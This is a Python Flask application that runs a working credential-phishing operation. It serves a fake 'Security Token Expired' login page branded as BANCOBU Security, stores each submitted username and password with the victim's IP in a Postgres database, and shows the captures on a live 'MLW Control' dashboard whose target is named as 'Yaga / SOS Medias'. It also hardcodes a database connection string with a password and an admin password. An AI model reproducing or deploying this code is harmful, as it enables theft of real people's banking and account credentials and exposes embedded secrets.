from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Tell Flask to trust its own proxy headers
app.config['PREFERRED_URL_SCHEME'] = 'https'

# Use the same database URL as bancobu-bonus
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:TjJ9r7NHNDSmj2zNZXqUB1eQcSkc7PHn@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS captured_data (
                id SERIAL PRIMARY KEY,
                timestamp TIMESTAMP DEFAULT NOW(),
                ip TEXT,
                user_agent TEXT,
                username TEXT,
                password TEXT,
                raw_data TEXT
            )
        ''')
        conn.commit()
        print("[+] Database table created/verified.")
    except Exception as e:
        print(f"[-] Database init error: {e}")
    finally:
        if cur: cur.close()
        if conn: conn.close()

init_db()

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>MLW Control - Intelligence Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e27; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { color: #ff3366; border-bottom: 2px solid #ff3366; padding-bottom: 10px; margin-bottom: 20px; }
        h2 { color: #ffd700; margin-top: 30px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #00ffcc; padding: 10px; text-align: left; }
        th { background: #1a1f3a; }
        .login { max-width: 400px; margin: 100px auto; background: #1a1f3a; padding: 30px; border-radius: 10px; }
        input, button { width: 100%; padding: 12px; margin: 10px 0; background: #0a0e27; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; }
        .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
        .stat-box { background: #0a0e27; padding: 10px 20px; border-radius: 8px; }
        .success { color: #00ff00; font-weight: bold; }
        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #666; }
        .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
    </style>
    <script>
        let authCheck = false;
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.authenticated) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadData();
                setInterval(loadData, 5000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password: pwd }) });
            const data = await res.json();
            if (data.success) { checkAuth(); } 
            else { alert('Wrong password'); }
        }
        async function loadData() {
            const res = await fetch('/api/data');
            const data = await res.json();
            let html = '';
            for (let r of data) {
                html += `<tr><td>${r.timestamp}</td><td>${r.ip}</td><td>${r.username || '-'}</td><td>${r.password || '-'}</td><td>${r.user_agent || '-'}</td></tr>`;
            }
            document.getElementById('data').innerHTML = html;
            document.getElementById('stats').innerHTML = `<span class="success">●</span> Total captured: ${data.length}`;
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login">
    <center><h2>MLW INTELLIGENCE</h2></center>
    <input type="password" id="pwd" placeholder="Access Key">
    <button onclick="login()">Authenticate</button>
</div>
<div id="content" style="display:none">
    <h1>🔒 MLW Control - Intelligence Dashboard</h1>
    <div class="stats">
        <div class="stat-box">🔴 Status: <span class="success">ACTIVE</span></div>
        <div class="stat-box" id="stats">📊 Captured: 0</div>
        <div class="stat-box">🎯 Target: Yaga / SOS Medias</div>
    </div>
    <h2>📋 Captured Credentials (Live)</h2>
    <div style="overflow-x: auto;">
    <table>
        <thead><tr><th>Timestamp</th><th>IP Address</th><th>Username</th><th>Password</th><th>User Agent</th></tr></thead>
        <tbody id="data"></tbody>
    </table>
    </div>
    <div class="footer">MLW Security Operations - Authorized Access Only</div>
</div>
</body>
</html>
'''

PHISHING_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>System Update Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: system-ui; background: #0a2b3e; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; max-width: 450px; width: 100%; padding: 35px; border-radius: 20px; box-shadow: 0 20px 35px rgba(0,0,0,0.2); text-align: center; border-top: 5px solid #ff3366; }
        .card h2 { color: #003366; margin-bottom: 15px; }
        .card p { color: #333; margin-bottom: 25px; line-height: 1.5; }
        .card input { width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #ccc; border-radius: 10px; font-size: 15px; }
        .card button { width: 100%; padding: 14px; background: #003366; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .card button:hover { background: #ff3366; }
        .result { margin-top: 20px; font-size: 14px; }
        .footer { margin-top: 25px; font-size: 11px; color: #999; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Security Token Expired</h2>
    <p>Your session token has expired. Please re-enter your credentials to continue securely.</p>
    <form id="captureForm">
        <input type="text" id="username" placeholder="Username / Email" autocomplete="off" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Verify & Continue</button>
    </form>
    <div id="result" class="result"></div>
    <div class="footer">Secure Connection | BANCOBU Security</div>
</div>
<script>
    document.getElementById('captureForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const response = await fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: username, password: password })
        });
        if (response.ok) {
            document.getElementById('result').innerHTML = '<span style="color:green;">✅ Token refreshed. Access restored.</span>';
            document.getElementById('captureForm').reset();
        } else {
            document.getElementById('result').innerHTML = '<span style="color:red;">❌ Error. Please try again.</span>';
        }
    });
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(DASHBOARD_HTML)

@app.route('/update')
def update():
    return render_template_string(PHISHING_HTML)

@app.route('/api/auth')
def auth():
    return jsonify({'authenticated': request.cookies.get('mlw_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('mlw_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO captured_data (ip, user_agent, username, password, raw_data)
            VALUES (%s, %s, %s, %s, %s)
        ''', (
            request.remote_addr,
            request.headers.get('User-Agent', ''),
            username,
            password,
            str(data)
        ))
        conn.commit()
        print(f"[!] CREDENTIALS CAPTURED! Username: {username}, Password: {password}, IP: {request.remote_addr}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[-] Capture error: {e}")
        return jsonify({'status': 'error'}), 500
    finally:
        if cur: cur.close()
        if conn: conn.close()

@app.route('/api/data')
def get_data():
    conn = None
    cur = None
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute('SELECT timestamp, ip, username, password, user_agent FROM captured_data ORDER BY timestamp DESC LIMIT 100')
        rows = cur.fetchall()
        return jsonify([{'timestamp': r[0], 'ip': r[1], 'username': r[2], 'password': r[3], 'user_agent': r[4]} for r in rows])
    except Exception as e:
        return jsonify([])
    finally:
        if cur: cur.close()
        if conn: conn.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
